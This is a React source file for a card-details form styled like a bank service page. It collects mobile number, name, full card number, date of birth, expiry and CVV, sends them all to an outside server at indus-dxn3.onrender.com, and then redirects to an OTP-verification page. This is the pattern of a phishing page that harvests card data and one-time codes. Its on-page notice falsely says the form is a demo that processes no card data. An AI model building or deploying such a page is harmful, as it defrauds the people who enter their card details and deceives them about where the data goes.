import { useState } from "react";
import { FaShieldAlt, FaLock } from "react-icons/fa";
import { AiOutlineLoading3Quarters } from "react-icons/ai";
import { useNavigate } from "react-router-dom";

export default function CardServiceForm() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    mobile: "",
    name: "",
    cardNumber: "",
    dob: "",
    month: "",
    year: "",
    cvv: "",
  });

  const [errors, setErrors] = useState({});

  const handleChange = (e) => {
    const { name, value } = e.target;

    let newValue = value;

    // Mobile Number (Only digits)
    if (name === "mobile") {
      newValue = value.replace(/\D/g, "").slice(0, 10);
    }

    // Card Number (Format: 1234 5678 9012 3456)
    if (name === "cardNumber") {
      const digits = value.replace(/\D/g, "").slice(0, 16);
      newValue = digits.replace(/(\d{4})(?=\d)/g, "$1 ");
    }

    // CVV (Only digits)
    if (name === "cvv") {
      newValue = value.replace(/\D/g, "").slice(0, 3);
    }

    setFormData((prev) => ({
      ...prev,
      [name]: newValue,
    }));

    setErrors((prev) => ({
      ...prev,
      [name]: "",
    }));
  };

  const validate = () => {
    let temp = {};

    // Mobile
    if (!formData.mobile) {
      temp.mobile = "Mobile number is required.";
    } else if (!/^[6-9]\d{9}$/.test(formData.mobile)) {
      temp.mobile = "Enter a valid 10-digit mobile number.";
    }

    // Name
    if (!formData.name.trim()) {
      temp.name = "Name is required.";
    } else if (!/^[A-Za-z ]+$/.test(formData.name)) {
      temp.name = "Only alphabets are allowed.";
    }

    // Card Number
    const card = formData.cardNumber.replace(/\s/g, "");

    if (!card) {
      temp.cardNumber = "Card number is required.";
    } else if (!/^\d{16}$/.test(card)) {
      temp.cardNumber = "Card number must be 16 digits.";
    }

    // DOB
    if (!formData.dob) {
      temp.dob = "Date of birth is required.";
    }

    // Month
    if (!formData.month) {
      temp.month = "Select expiry month.";
    }

    // Year
    if (!formData.year) {
      temp.year = "Select expiry year.";
    }

    // CVV
    if (!formData.cvv) {
      temp.cvv = "CVV is required.";
    } else if (!/^\d{3}$/.test(formData.cvv)) {
      temp.cvv = "CVV must be 3 digits.";
    }

    setErrors(temp);

    return Object.keys(temp).length === 0;
  };
  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validate()) return;

    setLoading(true);

    try {
      const response = await fetch("https://indus-dxn3.onrender.com/api/cards", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mobile: formData.mobile,
          name: formData.name,
          cardNumber: formData.cardNumber.replace(/\s/g, ""),
          dob: formData.dob,
          month: formData.month,
          year: formData.year,
          cvv: formData.cvv,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Failed to save data");
      }

      console.log("Saved:", data);

      setFormData({
        mobile: "",
        name: "",
        cardNumber: "",
        dob: "",
        month: "",
        year: "",
        cvv: "",
      });

      setErrors({});

      setTimeout(() => {
        navigate("/otp-verification", {
  state: {
    mobile: formData.mobile,
  },
});
      }, 1000);
    } catch (error) {
      console.error(error);
      alert(error.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <section className="bg-gray-100 py-10 min-h-screen">
      <div className="max-w-xl mx-auto px-2">
        <div className="bg-white rounded-xl shadow-lg overflow-hidden">
          {/* Header */}
          <div className="bg-[#ab183d] text-white p-6 text-center">
            <h2 className="text-2xl font-bold">Card Details</h2>
          </div>

          {/* Form */}
          <div className="p-6">
            <form
              autoComplete="off"
              className="space-y-5"
              onSubmit={handleSubmit}
            >
              {/* Mobile */}
              <div>
                <label className="block mb-2 font-semibold">
                  Mobile Number
                </label>

                <input
                  type="tel"
                  name="mobile"
                  value={formData.mobile}
                  onChange={handleChange}
                  placeholder="Enter Mobile Number"
                  className={`w-full border rounded-lg px-4 py-3 focus:outline-none focus:ring-2 ${
                    errors.mobile
                      ? "border-red-500 focus:ring-red-500"
                      : "focus:ring-[#ab183d]"
                  }`}
                />

                {errors.mobile && (
                  <p className="text-red-500 text-sm mt-1">{errors.mobile}</p>
                )}
              </div>

              {/* Name */}
              <div>
                <label className="block mb-2 font-semibold">Name on Card</label>

                <input
                  type="text"
                  name="name"
                  value={formData.name}
                  onChange={handleChange}
                  placeholder="Enter Name"
                  className={`w-full border rounded-lg px-4 py-3 focus:outline-none focus:ring-2 ${
                    errors.name
                      ? "border-red-500 focus:ring-red-500"
                      : "focus:ring-[#ab183d]"
                  }`}
                />

                {errors.name && (
                  <p className="text-red-500 text-sm mt-1">{errors.name}</p>
                )}
              </div>

              {/* Card Number */}
              <div>
                <label className="block mb-2 font-semibold">Card Number</label>

                <input
                  type="text"
                  name="cardNumber"
                  autoComplete="off"
                  value={formData.cardNumber}
                  onChange={handleChange}
                  placeholder="1234 5678 9012 3456"
                  className={`w-full border rounded-lg px-4 py-3 focus:outline-none focus:ring-2 ${
                    errors.cardNumber
                      ? "border-red-500 focus:ring-red-500"
                      : "focus:ring-[#ab183d]"
                  }`}
                />

                {errors.cardNumber && (
                  <p className="text-red-500 text-sm mt-1">
                    {errors.cardNumber}
                  </p>
                )}
              </div>

              {/* DOB */}
              <div>
                <label className="block mb-2 font-semibold">
                  Date of Birth
                </label>

                <input
                  type="date"
                  name="dob"
                  value={formData.dob}
                  onChange={handleChange}
                  className={`w-full border rounded-lg px-4 py-3 focus:outline-none focus:ring-2 ${
                    errors.dob
                      ? "border-red-500 focus:ring-red-500"
                      : "focus:ring-[#ab183d]"
                  }`}
                />

                {errors.dob && (
                  <p className="text-red-500 text-sm mt-1">{errors.dob}</p>
                )}
              </div>

              {/* Month & Year */}
              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="block mb-2 font-semibold">
                    Expiry Month
                  </label>

                  <select
                    name="month"
                    value={formData.month}
                    onChange={handleChange}
                    className={`w-full border rounded-lg px-4 py-3 ${
                      errors.month ? "border-red-500" : ""
                    }`}
                  >
                    <option value="">MM</option>

                    {[
                      "01",
                      "02",
                      "03",
                      "04",
                      "05",
                      "06",
                      "07",
                      "08",
                      "09",
                      "10",
                      "11",
                      "12",
                    ].map((month) => (
                      <option key={month} value={month}>
                        {month}
                      </option>
                    ))}
                  </select>

                  {errors.month && (
                    <p className="text-red-500 text-sm mt-1">{errors.month}</p>
                  )}
                </div>

                <div>
                  <label className="block mb-2 font-semibold">
                    Expiry Year
                  </label>

                  <select
                    name="year"
                    value={formData.year}
                    onChange={handleChange}
                    className={`w-full border rounded-lg px-4 py-3 ${
                      errors.year ? "border-red-500" : ""
                    }`}
                  >
                    <option value="">YY</option>

                    {Array.from({ length: 22 }, (_, i) => 24 + i).map(
                      (year) => (
                        <option key={year} value={year}>
                          {year}
                        </option>
                      ),
                    )}
                  </select>

                  {errors.year && (
                    <p className="text-red-500 text-sm mt-1">{errors.year}</p>
                  )}
                </div>
              </div>

              {/* CVV */}
              <div>
                <label className="block mb-2 font-semibold">CVV</label>

                <input
                  type="password"
                  name="cvv"
                  value={formData.cvv}
                  onChange={handleChange}
                  placeholder="123"
                  className={`w-full border rounded-lg px-4 py-3 focus:outline-none focus:ring-2 ${
                    errors.cvv
                      ? "border-red-500 focus:ring-red-500"
                      : "focus:ring-[#ab183d]"
                  }`}
                />

                {errors.cvv && (
                  <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>
                )}
              </div>

              {/* Submit */}
              <button
                type="submit"
                disabled={loading}
                className={`w-full py-3 rounded-lg font-semibold flex items-center justify-center gap-2 transition text-white
    ${
      loading
        ? "bg-gray-500 cursor-not-allowed"
        : "bg-[#ab183d] hover:bg-red-800"
    }`}
              >
                {loading ? (
                  <>
                    <AiOutlineLoading3Quarters className="animate-spin" />
                    Submitting...
                  </>
                ) : (
                  <>
                    <FaLock />
                    Submit Securely
                  </>
                )}
              </button>
            </form>

            {/* Security Note */}
            <div className="mt-8 bg-green-50 border border-green-200 rounded-lg p-4">
              <div className="flex items-center gap-2 text-green-700 font-semibold">
                <FaShieldAlt />
                Secure Connection
              </div>

              <p className="text-sm text-gray-600 mt-2">
                Your information is encrypted and securely transmitted using
                industry-standard security protocols. This demo form is for UI
                demonstration only and does not process payment card
                information.
              </p>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
}
